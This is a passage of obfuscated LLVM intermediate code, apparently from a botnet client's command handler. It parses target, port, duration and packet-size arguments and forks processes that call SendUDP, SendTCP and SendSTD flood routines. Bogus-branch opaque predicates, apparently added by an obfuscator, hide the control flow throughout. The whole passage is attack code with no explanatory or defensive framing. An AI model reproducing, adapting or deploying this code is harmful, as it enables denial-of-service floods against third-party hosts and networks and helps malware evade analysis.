  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %400
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 4
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @atoi(i8* %411) #9
  %413 = icmp eq i32 %412, -1
  %414 = load i32, i32* @x.87
  %415 = load i32, i32* @y.88
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %413, label %437, label %422

; <label>:422:                                    ; preds = %originalBBpart248
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 4
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @atoi(i8* %425) #9
  %427 = icmp sgt i32 %426, 1024
  br i1 %427, label %437, label %428

; <label>:428:                                    ; preds = %422
  %429 = load i32, i32* %3, align 4
  %430 = icmp eq i32 %429, 6
  br i1 %430, label %431, label %438

; <label>:431:                                    ; preds = %428
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 5
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  %436 = icmp slt i32 %435, 1
  br i1 %436, label %437, label %438

; <label>:437:                                    ; preds = %431, %422, %originalBBpart248, %394, %388, %originalBBpart244
  br label %1121

; <label>:438:                                    ; preds = %431, %428
  %439 = load i8**, i8*** %4, align 8
  %440 = getelementptr inbounds i8*, i8** %439, i64 1
  %441 = load i8*, i8** %440, align 8
  store i8* %441, i8** %11, align 8
  %442 = load i8**, i8*** %4, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 2
  %444 = load i8*, i8** %443, align 8
  %445 = call i32 @atoi(i8* %444) #9
  store i32 %445, i32* %12, align 4
  %446 = load i8**, i8*** %4, align 8
  %447 = getelementptr inbounds i8*, i8** %446, i64 3
  %448 = load i8*, i8** %447, align 8
  %449 = call i32 @atoi(i8* %448) #9
  store i32 %449, i32* %13, align 4
  %450 = load i8**, i8*** %4, align 8
  %451 = getelementptr inbounds i8*, i8** %450, i64 4
  %452 = load i8*, i8** %451, align 8
  %453 = call i32 @atoi(i8* %452) #9
  store i32 %453, i32* %14, align 4
  %454 = load i32, i32* %3, align 4
  %455 = icmp eq i32 %454, 6
  br i1 %455, label %456, label %461

; <label>:456:                                    ; preds = %438
  %457 = load i8**, i8*** %4, align 8
  %458 = getelementptr inbounds i8*, i8** %457, i64 5
  %459 = load i8*, i8** %458, align 8
  %460 = call i32 @atoi(i8* %459) #9
  br label %478

; <label>:461:                                    ; preds = %438
  %462 = load i32, i32* @x.87
  %463 = load i32, i32* @y.88
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %461
  %470 = load i32, i32* @x.87
  %471 = load i32, i32* @y.88
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %478

; <label>:478:                                    ; preds = %originalBBpart252, %456
  %479 = phi i32 [ %460, %456 ], [ 10, %originalBBpart252 ]
  store i32 %479, i32* %15, align 4
  store i32 32, i32* %16, align 4
  %480 = load i8*, i8** %11, align 8
  %481 = call i8* @strstr(i8* %480, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %482 = icmp ne i8* %481, null
  br i1 %482, label %483, label %550

; <label>:483:                                    ; preds = %478
  %484 = load i8*, i8** %11, align 8
  %485 = call i8* @strtok(i8* %484, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %485, i8** %17, align 8
  br label %486

; <label>:486:                                    ; preds = %531, %483
  %487 = load i8*, i8** %17, align 8
  %488 = icmp ne i8* %487, null
  br i1 %488, label %489, label %533

; <label>:489:                                    ; preds = %486
  %490 = load i32, i32* @x.87
  %491 = load i32, i32* @y.88
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %489
  %498 = call i32 @listFork()
  %499 = icmp ne i32 %498, 0
  %500 = load i32, i32* @x.87
  %501 = load i32, i32* @y.88
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %499, label %531, label %508

; <label>:508:                                    ; preds = %originalBBpart256
  %509 = load i32, i32* @x.87
  %510 = load i32, i32* @y.88
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %508
  %517 = load i8*, i8** %17, align 8
  %518 = load i32, i32* %12, align 4
  %519 = load i32, i32* %13, align 4
  %520 = load i32, i32* %14, align 4
  %521 = load i32, i32* %15, align 4
  %522 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %517, i32 %518, i32 %519, i32 %520, i32 %521, i32 %522)
  call void @_exit(i32 0) #11
  %523 = load i32, i32* @x.87
  %524 = load i32, i32* @y.88
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  unreachable

; <label>:531:                                    ; preds = %originalBBpart256
  %532 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %532, i8** %17, align 8
  br label %486

; <label>:533:                                    ; preds = %486
  %534 = load i32, i32* @x.87
  %535 = load i32, i32* @y.88
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %533
  %542 = load i32, i32* @x.87
  %543 = load i32, i32* @y.88
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %593

; <label>:550:                                    ; preds = %478
  %551 = load i32, i32* @x.87
  %552 = load i32, i32* @y.88
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %550
  %559 = call i32 @listFork()
  %560 = icmp ne i32 %559, 0
  %561 = load i32, i32* @x.87
  %562 = load i32, i32* @y.88
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %560, label %569, label %570

; <label>:569:                                    ; preds = %originalBBpart268
  br label %1121

; <label>:570:                                    ; preds = %originalBBpart268
  %571 = load i32, i32* @x.87
  %572 = load i32, i32* @y.88
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %570
  %579 = load i8*, i8** %11, align 8
  %580 = load i32, i32* %12, align 4
  %581 = load i32, i32* %13, align 4
  %582 = load i32, i32* %14, align 4
  %583 = load i32, i32* %15, align 4
  %584 = load i32, i32* %16, align 4
  call void @SendUDP(i8* %579, i32 %580, i32 %581, i32 %582, i32 %583, i32 %584)
  call void @_exit(i32 0) #11
  %585 = load i32, i32* @x.87
  %586 = load i32, i32* @y.88
  %587 = sub i32 %585, 1
  %588 = mul i32 %585, %587
  %589 = urem i32 %588, 2
  %590 = icmp eq i32 %589, 0
  %591 = icmp slt i32 %586, 10
  %592 = or i1 %590, %591
  br i1 %592, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  unreachable

; <label>:593:                                    ; preds = %originalBBpart264
  br label %594

; <label>:594:                                    ; preds = %593, %363
  %595 = load i8**, i8*** %4, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 0
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @strcmp(i8* %597, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.314, i32 0, i32 0)) #9
  %599 = icmp ne i32 %598, 0
  br i1 %599, label %865, label %600

; <label>:600:                                    ; preds = %594
  %601 = load i32, i32* %3, align 4
  %602 = icmp slt i32 %601, 6
  br i1 %602, label %681, label %603

; <label>:603:                                    ; preds = %600
  %604 = load i8**, i8*** %4, align 8
  %605 = getelementptr inbounds i8*, i8** %604, i64 3
  %606 = load i8*, i8** %605, align 8
  %607 = call i32 @atoi(i8* %606) #9
  %608 = icmp eq i32 %607, -1
  br i1 %608, label %681, label %609

; <label>:609:                                    ; preds = %603
  %610 = load i8**, i8*** %4, align 8
  %611 = getelementptr inbounds i8*, i8** %610, i64 2
  %612 = load i8*, i8** %611, align 8
  %613 = call i32 @atoi(i8* %612) #9
  %614 = icmp eq i32 %613, -1
  br i1 %614, label %681, label %615

; <label>:615:                                    ; preds = %609
  %616 = load i32, i32* @x.87
  %617 = load i32, i32* @y.88
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %615
  %624 = load i32, i32* %3, align 4
  %625 = icmp sgt i32 %624, 5
  %626 = load i32, i32* @x.87
  %627 = load i32, i32* @y.88
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %625, label %634, label %656

; <label>:634:                                    ; preds = %originalBBpart276
  %635 = load i32, i32* @x.87
  %636 = load i32, i32* @y.88
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %634
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 5
  %645 = load i8*, i8** %644, align 8
  %646 = call i32 @atoi(i8* %645) #9
  %647 = icmp slt i32 %646, 0
  %648 = load i32, i32* @x.87
  %649 = load i32, i32* @y.88
  %650 = sub i32 %648, 1
  %651 = mul i32 %648, %650
  %652 = urem i32 %651, 2
  %653 = icmp eq i32 %652, 0
  %654 = icmp slt i32 %649, 10
  %655 = or i1 %653, %654
  br i1 %655, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %647, label %681, label %656

; <label>:656:                                    ; preds = %originalBBpart280, %originalBBpart276
  %657 = load i32, i32* %3, align 4
  %658 = icmp eq i32 %657, 7
  br i1 %658, label %659, label %682

; <label>:659:                                    ; preds = %656
  %660 = load i32, i32* @x.87
  %661 = load i32, i32* @y.88
  %662 = sub i32 %660, 1
  %663 = mul i32 %660, %662
  %664 = urem i32 %663, 2
  %665 = icmp eq i32 %664, 0
  %666 = icmp slt i32 %661, 10
  %667 = or i1 %665, %666
  br i1 %667, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %659
  %668 = load i8**, i8*** %4, align 8
  %669 = getelementptr inbounds i8*, i8** %668, i64 6
  %670 = load i8*, i8** %669, align 8
  %671 = call i32 @atoi(i8* %670) #9
  %672 = icmp slt i32 %671, 1
  %673 = load i32, i32* @x.87
  %674 = load i32, i32* @y.88
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %672, label %681, label %682

; <label>:681:                                    ; preds = %originalBBpart284, %originalBBpart280, %609, %603, %600
  br label %1121

; <label>:682:                                    ; preds = %originalBBpart284, %656
  %683 = load i8**, i8*** %4, align 8
  %684 = getelementptr inbounds i8*, i8** %683, i64 1
  %685 = load i8*, i8** %684, align 8
  store i8* %685, i8** %18, align 8
  %686 = load i8**, i8*** %4, align 8
  %687 = getelementptr inbounds i8*, i8** %686, i64 2
  %688 = load i8*, i8** %687, align 8
  %689 = call i32 @atoi(i8* %688) #9
  store i32 %689, i32* %19, align 4
  %690 = load i8**, i8*** %4, align 8
  %691 = getelementptr inbounds i8*, i8** %690, i64 3
  %692 = load i8*, i8** %691, align 8
  %693 = call i32 @atoi(i8* %692) #9
  store i32 %693, i32* %20, align 4
  %694 = load i8**, i8*** %4, align 8
  %695 = getelementptr inbounds i8*, i8** %694, i64 4
  %696 = load i8*, i8** %695, align 8
  store i8* %696, i8** %21, align 8
  %697 = load i32, i32* %3, align 4
  %698 = icmp eq i32 %697, 7
  br i1 %698, label %699, label %704

; <label>:699:                                    ; preds = %682
  %700 = load i8**, i8*** %4, align 8
  %701 = getelementptr inbounds i8*, i8** %700, i64 6
  %702 = load i8*, i8** %701, align 8
  %703 = call i32 @atoi(i8* %702) #9
  br label %721

; <label>:704:                                    ; preds = %682
  %705 = load i32, i32* @x.87
  %706 = load i32, i32* @y.88
  %707 = sub i32 %705, 1
  %708 = mul i32 %705, %707
  %709 = urem i32 %708, 2
  %710 = icmp eq i32 %709, 0
  %711 = icmp slt i32 %706, 10
  %712 = or i1 %710, %711
  br i1 %712, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %704
  %713 = load i32, i32* @x.87
  %714 = load i32, i32* @y.88
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %721

; <label>:721:                                    ; preds = %originalBBpart288, %699
  %722 = phi i32 [ %703, %699 ], [ 10, %originalBBpart288 ]
  %723 = load i32, i32* @x.87
  %724 = load i32, i32* @y.88
  %725 = sub i32 %723, 1
  %726 = mul i32 %723, %725
  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %721
  store i32 %722, i32* %22, align 4
  %731 = load i32, i32* %3, align 4
  %732 = icmp sgt i32 %731, 5
  %733 = load i32, i32* @x.87
  %734 = load i32, i32* @y.88
  %735 = sub i32 %733, 1
  %736 = mul i32 %733, %735
  %737 = urem i32 %736, 2
  %738 = icmp eq i32 %737, 0
  %739 = icmp slt i32 %734, 10
  %740 = or i1 %738, %739
  br i1 %740, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %732, label %741, label %762

; <label>:741:                                    ; preds = %originalBBpart292
  %742 = load i32, i32* @x.87
  %743 = load i32, i32* @y.88
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %741
  %750 = load i8**, i8*** %4, align 8
  %751 = getelementptr inbounds i8*, i8** %750, i64 5
  %752 = load i8*, i8** %751, align 8
  %753 = call i32 @atoi(i8* %752) #9
  %754 = load i32, i32* @x.87
  %755 = load i32, i32* @y.88
  %756 = sub i32 %754, 1
  %757 = mul i32 %754, %756
  %758 = urem i32 %757, 2
  %759 = icmp eq i32 %758, 0
  %760 = icmp slt i32 %755, 10
  %761 = or i1 %759, %760
  br i1 %761, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %763

; <label>:762:                                    ; preds = %originalBBpart292
  br label %763

; <label>:763:                                    ; preds = %762, %originalBBpart296
  %764 = phi i32 [ %753, %originalBBpart296 ], [ 0, %762 ]
  %765 = load i32, i32* @x.87
  %766 = load i32, i32* @y.88
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %763
  store i32 %764, i32* %23, align 4
  store i32 32, i32* %24, align 4
  %773 = load i8*, i8** %18, align 8
  %774 = call i8* @strstr(i8* %773, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %775 = icmp ne i8* %774, null
  %776 = load i32, i32* @x.87
  %777 = load i32, i32* @y.88
  %778 = sub i32 %776, 1
  %779 = mul i32 %776, %778
  %780 = urem i32 %779, 2
  %781 = icmp eq i32 %780, 0
  %782 = icmp slt i32 %777, 10
  %783 = or i1 %781, %782
  br i1 %783, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %775, label %784, label %820

; <label>:784:                                    ; preds = %originalBBpart2100
  %785 = load i8*, i8** %18, align 8
  %786 = call i8* @strtok(i8* %785, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %786, i8** %25, align 8
  br label %787

; <label>:787:                                    ; preds = %817, %784
  %788 = load i8*, i8** %25, align 8
  %789 = icmp ne i8* %788, null
  br i1 %789, label %790, label %819

; <label>:790:                                    ; preds = %787
  %791 = load i32, i32* @x.87
  %792 = load i32, i32* @y.88
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %790
  %799 = call i32 @listFork()
  %800 = icmp ne i32 %799, 0
  %801 = load i32, i32* @x.87
  %802 = load i32, i32* @y.88
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %800, label %817, label %809

; <label>:809:                                    ; preds = %originalBBpart2104
  %810 = load i8*, i8** %25, align 8
  %811 = load i32, i32* %19, align 4
  %812 = load i32, i32* %20, align 4
  %813 = load i8*, i8** %21, align 8
  %814 = load i32, i32* %23, align 4
  %815 = load i32, i32* %22, align 4
  %816 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %810, i32 %811, i32 %812, i8* %813, i32 %814, i32 %815, i32 %816)
  call void @_exit(i32 0) #11
  unreachable

; <label>:817:                                    ; preds = %originalBBpart2104
  %818 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %818, i8** %25, align 8
  br label %787

; <label>:819:                                    ; preds = %787
  br label %848

; <label>:820:                                    ; preds = %originalBBpart2100
  %821 = call i32 @listFork()
  %822 = icmp ne i32 %821, 0
  br i1 %822, label %823, label %824

; <label>:823:                                    ; preds = %820
  br label %1121

; <label>:824:                                    ; preds = %820
  %825 = load i32, i32* @x.87
  %826 = load i32, i32* @y.88
  %827 = sub i32 %825, 1
  %828 = mul i32 %825, %827
  %829 = urem i32 %828, 2
  %830 = icmp eq i32 %829, 0
  %831 = icmp slt i32 %826, 10
  %832 = or i1 %830, %831
  br i1 %832, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %824
  %833 = load i8*, i8** %18, align 8
  %834 = load i32, i32* %19, align 4
  %835 = load i32, i32* %20, align 4
  %836 = load i8*, i8** %21, align 8
  %837 = load i32, i32* %23, align 4
  %838 = load i32, i32* %22, align 4
  %839 = load i32, i32* %24, align 4
  call void @SendTCP(i8* %833, i32 %834, i32 %835, i8* %836, i32 %837, i32 %838, i32 %839)
  call void @_exit(i32 0) #11
  %840 = load i32, i32* @x.87
  %841 = load i32, i32* @y.88
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  unreachable

; <label>:848:                                    ; preds = %819
  %849 = load i32, i32* @x.87
  %850 = load i32, i32* @y.88
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %848
  %857 = load i32, i32* @x.87
  %858 = load i32, i32* @y.88
  %859 = sub i32 %857, 1
  %860 = mul i32 %857, %859
  %861 = urem i32 %860, 2
  %862 = icmp eq i32 %861, 0
  %863 = icmp slt i32 %858, 10
  %864 = or i1 %862, %863
  br i1 %864, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %865

; <label>:865:                                    ; preds = %originalBBpart2112, %594
  %866 = load i8**, i8*** %4, align 8
  %867 = getelementptr inbounds i8*, i8** %866, i64 0
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 @strcmp(i8* %868, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.315, i32 0, i32 0)) #9
  %870 = icmp ne i32 %869, 0
  br i1 %870, label %1007, label %871

; <label>:871:                                    ; preds = %865
  %872 = load i32, i32* %3, align 4
  %873 = icmp slt i32 %872, 4
  br i1 %873, label %902, label %874

; <label>:874:                                    ; preds = %871
  %875 = load i8**, i8*** %4, align 8
  %876 = getelementptr inbounds i8*, i8** %875, i64 2
  %877 = load i8*, i8** %876, align 8
  %878 = call i32 @atoi(i8* %877) #9
  %879 = icmp slt i32 %878, 1
  br i1 %879, label %902, label %880

; <label>:880:                                    ; preds = %874
  %881 = load i32, i32* @x.87
  %882 = load i32, i32* @y.88
  %883 = sub i32 %881, 1
  %884 = mul i32 %881, %883
  %885 = urem i32 %884, 2
  %886 = icmp eq i32 %885, 0
  %887 = icmp slt i32 %882, 10
  %888 = or i1 %886, %887
  br i1 %888, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %880
  %889 = load i8**, i8*** %4, align 8
  %890 = getelementptr inbounds i8*, i8** %889, i64 3
  %891 = load i8*, i8** %890, align 8
  %892 = call i32 @atoi(i8* %891) #9
  %893 = icmp slt i32 %892, 1
  %894 = load i32, i32* @x.87
  %895 = load i32, i32* @y.88
  %896 = sub i32 %894, 1
  %897 = mul i32 %894, %896
  %898 = urem i32 %897, 2
  %899 = icmp eq i32 %898, 0
  %900 = icmp slt i32 %895, 10
  %901 = or i1 %899, %900
  br i1 %901, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %893, label %902, label %903

; <label>:902:                                    ; preds = %originalBBpart2116, %874, %871
  br label %1121

; <label>:903:                                    ; preds = %originalBBpart2116
  %904 = load i32, i32* @x.87
  %905 = load i32, i32* @y.88
  %906 = sub i32 %904, 1
  %907 = mul i32 %904, %906
  %908 = urem i32 %907, 2
  %909 = icmp eq i32 %908, 0
  %910 = icmp slt i32 %905, 10
  %911 = or i1 %909, %910
  br i1 %911, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %903
  %912 = load i8**, i8*** %4, align 8
  %913 = getelementptr inbounds i8*, i8** %912, i64 1
  %914 = load i8*, i8** %913, align 8
  store i8* %914, i8** %26, align 8
  %915 = load i8**, i8*** %4, align 8
  %916 = getelementptr inbounds i8*, i8** %915, i64 2
  %917 = load i8*, i8** %916, align 8
  %918 = call i32 @atoi(i8* %917) #9
  store i32 %918, i32* %27, align 4
  %919 = load i8**, i8*** %4, align 8
  %920 = getelementptr inbounds i8*, i8** %919, i64 3
  %921 = load i8*, i8** %920, align 8
  %922 = call i32 @atoi(i8* %921) #9
  store i32 %922, i32* %28, align 4
  %923 = load i8*, i8** %26, align 8
  %924 = call i8* @strstr(i8* %923, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #9
  %925 = icmp ne i8* %924, null
  %926 = load i32, i32* @x.87
  %927 = load i32, i32* @y.88
  %928 = sub i32 %926, 1
  %929 = mul i32 %926, %928
  %930 = urem i32 %929, 2
  %931 = icmp eq i32 %930, 0
  %932 = icmp slt i32 %927, 10
  %933 = or i1 %931, %932
  br i1 %933, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %925, label %934, label %982

; <label>:934:                                    ; preds = %originalBBpart2120
  %935 = load i32, i32* @x.87
  %936 = load i32, i32* @y.88
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %934
  %943 = load i8*, i8** %26, align 8
  %944 = call i8* @strtok(i8* %943, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %944, i8** %29, align 8
  %945 = load i32, i32* @x.87
  %946 = load i32, i32* @y.88
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %953

; <label>:953:                                    ; preds = %979, %originalBBpart2124
  %954 = load i32, i32* @x.87
  %955 = load i32, i32* @y.88
  %956 = sub i32 %954, 1
  %957 = mul i32 %954, %956
  %958 = urem i32 %957, 2
  %959 = icmp eq i32 %958, 0
  %960 = icmp slt i32 %955, 10
  %961 = or i1 %959, %960
  br i1 %961, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %953
  %962 = load i8*, i8** %29, align 8
  %963 = icmp ne i8* %962, null
  %964 = load i32, i32* @x.87
  %965 = load i32, i32* @y.88
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br i1 %963, label %972, label %981

; <label>:972:                                    ; preds = %originalBBpart2128
  %973 = call i32 @listFork()
  %974 = icmp ne i32 %973, 0
  br i1 %974, label %979, label %975

; <label>:975:                                    ; preds = %972
  %976 = load i8*, i8** %29, align 8
  %977 = load i32, i32* %27, align 4
  %978 = load i32, i32* %28, align 4
  call void @SendSTD(i8* %976, i32 %977, i32 %978)
  call void @_exit(i32 0) #11
  unreachable

; <label>:979:                                    ; preds = %972
